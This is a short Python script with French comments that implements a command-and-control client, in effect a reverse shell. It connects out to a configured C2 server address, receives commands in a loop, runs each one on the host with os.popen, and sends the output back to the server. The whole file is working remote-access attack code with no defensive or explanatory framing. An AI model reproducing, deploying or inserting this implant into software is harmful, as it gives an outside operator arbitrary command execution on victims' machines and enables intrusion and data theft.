import socket
import os

# Configuration du client
SERVER_IP = '192.168.2.15'  # Remplace par l'adresse IP du serveur C2
PORT = 8080

def connect_to_server():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((SERVER_IP, PORT))
    print("[+] Connecté au serveur C2")

    try:
        while True:
            # Recevoir la commande du serveur
            command = client_socket.recv(1024).decode()
            if not command:
                break

            # Exécuter la commande sur le client
            output = os.popen(command).read()

            # Envoyer la sortie au serveur
            client_socket.send(output.encode())
    except Exception as e:
        print(f"[-] Erreur: {e}")
    finally:
        print("[-] Déconnexion du serveur")
        client_socket.close()

if __name__ == "__main__":
    connect_to_server()
